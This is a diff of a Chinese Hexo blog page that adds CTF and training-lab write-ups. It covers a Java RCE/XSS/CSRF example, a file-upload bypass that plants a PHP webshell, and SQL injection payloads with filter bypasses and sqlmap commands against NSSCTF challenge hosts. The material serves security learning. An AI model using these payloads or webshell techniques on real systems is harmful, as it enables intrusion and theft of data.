@@ -28,7 +28,39 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/23/pikachu%E9%9D%B6%E5%9C%BA/">pikachu-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-23</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-26</span></span></div></header><div class="post-body"><div class="post-excerpt">
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/28/SecExample/">[ Untitled ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-28</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="SQL注入"   >
+          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
+      
+        <h1 id="RCE"   >
+          <a href="#RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281403684.png" alt="image-20240528140353654"></p>
+<p>映射 <code>/rce</code> 的 GET 请求到 <code>input</code> 方法</p>
+<p><code>public String input()</code> 方法返回视图名称 <code>&quot;rce/rce&quot;</code>，渲染 <code>rce/rce</code> 页面</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281404456.png" alt="image-20240528140417408"></p>
+<p>从请求参数中获取名为 <code>command</code> 的值</p>
+<p>检查 <code>command</code> 是否为 <code>null</code> 或空字符串，如果是，则默认设置为 <code>&quot;whoami&quot;</code></p>
+<p>声明 <code>Process</code> 对象 <code>p</code>，用于存储运行的进程；声明 <code>String</code> 变量 <code>result</code>，用于存储命令执行的结果</p>
+<p>使用 <code>Runtime.getRuntime().exec(command)</code> 执行命令（<code>Runtime.getRuntime().exec()</code> 是 Java 中用于在运行时执行系统命令的一个函数，<code>Runtime</code> 类允许应用程序与运行时环境进行交互）</p>
+<p>如果执行命令时发生 <code>IOException</code>，捕获异常并打印堆栈跟踪</p>
+<p>获取命令执行的标准输出流 <code>InputStream</code>，使用 <code>BufferedReader</code> 逐行读取标准输出，在 <code>while (true)</code> 循环中读取每一行的输出，并将其存储在 <code>result</code> 中，当读取到 <code>null</code> 时，表示输出结束，退出循环，如果在读取过程中发生 <code>IOException</code>，捕获异常并打印堆栈跟踪</p>
+
+        <h1 id="spel表达式注入"   >
+          <a href="#spel表达式注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#spel表达式注入" class="headerlink" title="spel表达式注入"></a>spel表达式注入</h1>
+      
+        <h1 id="XSS"   >
+          <a href="#XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281517734.png" alt="image-20240528151727685"></p>
+<p>从请求参数中获取名为 <code>name</code> 的值，并将其赋给 <code>name</code> 变量</p>
+<p>将 <code>Person</code> 对象添加到模型中，以便在视图中显示</p>
+<p>返回视图名称 <code>xss/xssoutput</code>，用于渲染输出页面</p>
+<p>由于用户输入的 <code>name</code> 值直接显示在输出页面 <code>xssoutput</code> 上，将用户输入的内容嵌入到 HTML 中，所以如果用户输入包含恶意脚本代码，会导致 XSS 攻击</p>
+
+        <h1 id="CSRF"   >
+          <a href="#CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281619851.png" alt="image-20240528161919791"></p>
+<p>从请求中获取 <code>User</code> 对象 <code>user1</code> 并设置到类成员变量 <code>user</code> 中，使用 <code>userService.addUser(user)</code> 将用户添加到服务中</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/23/pikachu%E9%9D%B6%E5%9C%BA/">pikachu-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-23</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-26</span></span></div></header><div class="post-body"><div class="post-excerpt">
         <h1 id="暴力破解"   >
           <a href="#暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1>
       
@@ -2260,7 +2292,7 @@ exit;
 <p><code>?arg01=a&amp;arg02=b%20onmouseover=alert(1)</code></p>
 <p>(onclick不行，应该是因为加载不出图片无法点击，所以用不了这个事件)</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310190923882.png" alt="image-20231019092332845"></p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/01/06/NSSCTF%20WEB/">NSSCTF WEB</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-26</span></span></div></header><div class="post-body"><div class="post-excerpt">
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/01/06/NSSCTF%20WEB/">NSSCTF WEB</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-28</span></span></div></header><div class="post-body"><div class="post-excerpt">
         <h2 id="一、-SWPUCTF-2021-新生赛-jicao"   >
           <a href="#一、-SWPUCTF-2021-新生赛-jicao" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、-SWPUCTF-2021-新生赛-jicao" class="headerlink" title="一、[SWPUCTF 2021 新生赛]jicao"></a>一、[SWPUCTF 2021 新生赛]jicao</h2>
       <p>打开后出现这样一堆代码</p>
@@ -2484,6 +2516,10 @@ exit;
 <p>回车得到flag</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301161338946.png" alt="image-20230116133842852"></p>
 
+        <h2 id="十一、-HCTF-2018-Warmup"   >
+          <a href="#十一、-HCTF-2018-Warmup" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、-HCTF-2018-Warmup" class="headerlink" title="十一、[HCTF 2018]Warmup"></a>十一、[HCTF 2018]Warmup</h2>
+      <p>见”BUU-1.md”</p>
+
         <h2 id="十五、-SWPUCTF-2021-新生赛-easyupload1-0"   >
           <a href="#十五、-SWPUCTF-2021-新生赛-easyupload1-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、-SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="十五、[SWPUCTF 2021 新生赛]easyupload1.0"></a>十五、[SWPUCTF 2021 新生赛]easyupload1.0</h2>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151651849.png" alt="image-20240115165127781"></p>
@@ -2502,6 +2538,27 @@ exit;
 <p>添加数据后在文件列表里找到flag</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151659646.png" alt="image-20240115165912580"></p>
 <p>尝试提交发现是假的，，，</p>
+
+        <h2 id="十六、-SWPUCTF-2021-新生赛-easyupload2-0"   >
+          <a href="#十六、-SWPUCTF-2021-新生赛-easyupload2-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#十六、-SWPUCTF-2021-新生赛-easyupload2-0" class="headerlink" title="十六、[SWPUCTF 2021 新生赛]easyupload2.0"></a>十六、[SWPUCTF 2021 新生赛]easyupload2.0</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281112129.png" alt="image-20240528111251083"></p>
+<p>文件上传题，上传一个写有一句话木马的php文件后提示不行，那上传一个jpg格式的</p>
+<p>上传成功，抓一下包改后缀为php</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281124594.png" alt="image-20240528112411553"></p>
+<p>还是被它识别出来了</p>
+
+        <h6 id="绕过后缀的有文件格式有php-php3-php4-php5-phtml-pht"   >
+          <a href="#绕过后缀的有文件格式有php-php3-php4-php5-phtml-pht" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过后缀的有文件格式有php-php3-php4-php5-phtml-pht" class="headerlink" title="绕过后缀的有文件格式有php,php3,php4,php5,phtml,pht"></a>绕过后缀的有文件格式有php,php3,php4,php5,phtml,pht</h6>
+      <p>所以把后缀改成phtml试试，上传成功</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281318724.png" alt="image-20240528131855656"></p>
+<p>蚁剑连接 （注意URL这里还有一个./）</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281321345.png" alt="image-20240528132159271"></p>
+<p>添加数据后打开文件管理，找到flag.php</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281324123.png" alt="image-20240528132410073"></p>
+
+        <h2 id="十七、-GXYCTF2019-BabyUpload-1"   >
+          <a href="#十七、-GXYCTF2019-BabyUpload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十七、-GXYCTF2019-BabyUpload-1" class="headerlink" title="十七、[GXYCTF2019]BabyUpload 1"></a>十七、[GXYCTF2019]BabyUpload 1</h2>
+      <p>见“BUU-1.md”</p>
 
         <h2 id="十八、-SWPUCTF-2021-新生赛-caidao"   >
           <a href="#十八、-SWPUCTF-2021-新生赛-caidao" class="heading-link"><i class="fas fa-link"></i></a><a href="#十八、-SWPUCTF-2021-新生赛-caidao" class="headerlink" title="十八、[SWPUCTF 2021 新生赛]caidao"></a>十八、[SWPUCTF 2021 新生赛]caidao</h2>
@@ -3168,7 +3225,7 @@ exit;
       <p>输入</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=1&#x27; or &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261151471.png" alt="image-20240526115102427"></p>
+<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527162030720.png" alt="image-20240527162030720"></p>
 <p>能正常返回说明是字符型注入</p>
 
         <h5 id="判断列数"   >
@@ -3184,7 +3241,7 @@ exit;
           <a href="#获取数据库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h5>
       <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261154185.png" alt="image-20240526115414106"></p>
+<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527162049911.png" alt="image-20240527162049911"></p>
 
         <h5 id="获取表名"   >
           <a href="#获取表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h5>
@@ -3198,7 +3255,7 @@ exit;
       <p>查看test_tb里的字段</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27; and table_name=&#x27;test_tb&#x27;--+</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261157227.png" alt="image-20240526115707162"></p>
+<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527162109023.png" alt="image-20240527162109023"></p>
 
         <h5 id="获取字段内容"   >
           <a href="#获取字段内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h5>
@@ -3206,6 +3263,175 @@ exit;
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27; union select 1,2,group_concat(flag) from test_db.test_tb--+</span><br></pre></td></tr></table></div></figure>
 
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261158456.png" alt="image-20240526115822405"></p>
+
+        <h2 id="五十七、-NCTF-2018-签到题"   >
+          <a href="#五十七、-NCTF-2018-签到题" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十七、-NCTF-2018-签到题" class="headerlink" title="五十七、[NCTF 2018]签到题"></a>五十七、[NCTF 2018]签到题</h2>
+      <p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527160736048.png" alt="image-20240527160736048"></p>
+<p>一点开是一个百度的页面，但是URL上显示是一个/secret.php，访问一下首页/index.php，查看网页源代码也啥也没看见</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405271608920.png" alt="image-20240527160834865"></p>
+<p>抓包发送到Repeater再发包</p>
+<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527160945174.png" alt="image-20240527160945174"></p>
+<p>看到了flag，但是提交时要以NSSCTF{}格式提交</p>
+
+        <h2 id="五十八、-SWPUCTF-2021-新生赛-error"   >
+          <a href="#五十八、-SWPUCTF-2021-新生赛-error" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十八、-SWPUCTF-2021-新生赛-error" class="headerlink" title="五十八、[SWPUCTF 2021 新生赛]error"></a>五十八、[SWPUCTF 2021 新生赛]error</h2>
+      <p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527162650715.png" alt="image-20240527162650715"></p>
+<p>输入1后url传入id参数，可以直接用sqlmap</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node4.anna.nssctf.cn:28238/index.php?id=1&quot; --dbs</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node4.anna.nssctf.cn:28238/index.php?id=1&quot; -D test_db --tables</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node4.anna.nssctf.cn:28238/index.php?id=1&quot; -D test_db -T test_tb --columns</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node4.anna.nssctf.cn:28238/index.php?id=1&quot; -D test_db -T test_tb -C flag -dump</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527162825865.png" alt="image-20240527162825865"></p>
+
+        <h2 id="五十九、-SWPUCTF-2021-新生赛-sql"   >
+          <a href="#五十九、-SWPUCTF-2021-新生赛-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十九、-SWPUCTF-2021-新生赛-sql" class="headerlink" title="五十九、[SWPUCTF 2021 新生赛]sql"></a>五十九、[SWPUCTF 2021 新生赛]sql</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281040540.png" alt="image-20240528104050452"></p>
+<p>参数是wllm，按老步骤注入</p>
+<p>传入1’报语句错误从，存在注入</p>
+<p>再传入1‘ or ’1‘=’1，提示请勿非法操作，看来是存在过滤</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281043049.png" alt="image-20240528104321959"></p>
+<p>分别传入or、=、 1（前面有一个空格），发出只有or没有警告，所以是过滤了等号和空格</p>
+<p>空格用/**/来绕过，等号用like代替</p>
+
+        <h5 id="判断列数-1"   >
+          <a href="#判断列数-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断列数-1" class="headerlink" title="判断列数"></a>判断列数</h5>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,3#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281049367.png" alt="image-20240528104932263"></p>
+<p>看来是最后的#也被过滤了，用URL编码为%23</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,3%23</span><br></pre></td></tr></table></div></figure>
+
+<p>可得有三列</p>
+
+        <h5 id="获取数据库名-1"   >
+          <a href="#获取数据库名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h5>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,group_concat(schema_name)/**/from/**/information_schema.schemata%23</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281053010.png" alt="image-20240528105350910"></p>
+<p>但是只有一部分，使用截断函数一段一段的输出，尝试之后substr、left、right函数都被过滤了，这里用mid，这里最多只能显示20个字符，所以只能20个字符20个字符的输出</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,mid(group_concat(schema_name),21,20)/**/from/**/information_schema.schemata%23</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281055906.png" alt="image-20240528105507807"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=%27union/**/select/**/1,2,mid(group_concat(schema_name),41,20)/**/from/**/information_schema.schemata%23</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281055923.png" alt="image-20240528105524822"></p>
+
+        <h5 id="获取表名-1"   >
+          <a href="#获取表名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h5>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;%23   </span><br><span class="line">#LTLT_flag</span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="获取表字段名-1"   >
+          <a href="#获取表字段名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表字段名-1" class="headerlink" title="获取表字段名"></a>获取表字段名</h5>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;/**/and/**/table_name/**/like/**/&#x27;LTLT_flag&#x27;%23</span><br></pre></td></tr></table></div></figure>
+
+<p>还是出现了弹窗，猜测是过滤了关键词and，但是只要存在就会有警告框，所以只能更改语句</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;%23  </span><br><span class="line">#flag</span><br><span class="line">#因为过滤了and，所以语句中只有数据库名</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281103979.png" alt="image-20240528110354927"></p>
+
+        <h5 id="获取字段内容-1"   >
+          <a href="#获取字段内容-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段内容-1" class="headerlink" title="获取字段内容"></a>获取字段内容</h5>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,group_concat(flag)/**/from/**/test_db.LTLT_flag%23</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405271659850.png" alt="image-20240527165905805"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,mid(group_concat(flag),21,20)/**/from/**/test_db.LTLT_flag%23</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527170507333.png" alt="image-20240527170507333"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,mid(group_concat(flag),41,20)/**/from/**/test_db.LTLT_flag%23</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527170602884.png" alt="image-20240527170602884"></p>
+<p>SQL注入绕过技巧：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Cairo_A/article/details/134882367" >https://blog.csdn.net/Cairo_A/article/details/134882367</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="六十、-LitCTF-2023-Http-pro-max-plus"   >
+          <a href="#六十、-LitCTF-2023-Http-pro-max-plus" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十、-LitCTF-2023-Http-pro-max-plus" class="headerlink" title="六十、[LitCTF 2023]Http pro max plus"></a>六十、[LitCTF 2023]Http pro max plus</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272047355.png" alt="image-20240527204753296"></p>
+<p>那就添加X-Forwarded-For头</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272046340.png" alt="image-20240527204645273"></p>
+<p>看来用X-Forwarded-For不行，查了一下说是添加client-ip为127.0.0.1</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272045315.png" alt="image-20240527204524247"></p>
+<p>添加Referer字段值为pornhub.com</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272044268.png" alt="image-20240527204431197"></p>
+<p>添加User-Agent字段值为Chrome</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272043272.png" alt="image-20240527204318198"></p>
+<p>添加代理via=的值为Clash.win</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272033772.png" alt="image-20240527203337713"></p>
+<p>访问/wtfwtfwtfwtf.php</p>
+<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527172302155.png" alt="image-20240527172302155"></p>
+<p>查看网页源代码看到/sejishikong.php，访问一下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405271722292.png" alt="image-20240527172229251"></p>
+
+        <h2 id="六十一、-SWPUCTF-2022-新生赛-xff"   >
+          <a href="#六十一、-SWPUCTF-2022-新生赛-xff" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十一、-SWPUCTF-2022-新生赛-xff" class="headerlink" title="六十一、[SWPUCTF 2022 新生赛]xff"></a>六十一、[SWPUCTF 2022 新生赛]xff</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405280954588.png" alt="image-20240528095438474"></p>
+<p>从题目入手，用HackBar添加X-Forwarded-For头为127.0.0.1</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405280955712.png" alt="image-20240528095536671"></p>
+<p>再添加Referer头为index，但几次尝试下来发现只要Referer有值就能得到flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405280956014.png" alt="image-20240528095630962"></p>
+
+        <h2 id="六十二、-SWPUCTF-2022-新生赛-ez-sql"   >
+          <a href="#六十二、-SWPUCTF-2022-新生赛-ez-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十二、-SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="六十二、[SWPUCTF 2022 新生赛]ez_sql"></a>六十二、[SWPUCTF 2022 新生赛]ez_sql</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281006807.png" alt="image-20240528100626739"></p>
+<p>在URL上传参会提示</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281006251.png" alt="image-20240528100659171"></p>
+<p>那就是用POST方式，那就用HackBar传</p>
+<p>传参为1时就有flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281008834.png" alt="image-20240528100810736"></p>
+<p>但是提交了发现没那么简单…</p>
+<p>传入1‘，有语句报错，再次传入1‘ or ’1‘=’1，还是和1一样的显示，判断是字符型注入</p>
+<p>按照老步骤</p>
+
+        <h5 id="判断列数-2"   >
+          <a href="#判断列数-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断列数-2" class="headerlink" title="判断列数"></a>判断列数</h5>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;union select 1,2,3#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281019285.png" alt="image-20240528101905219"></p>
+<p>但是有语句报错，可以看到是把前面的union和空格都过滤了</p>
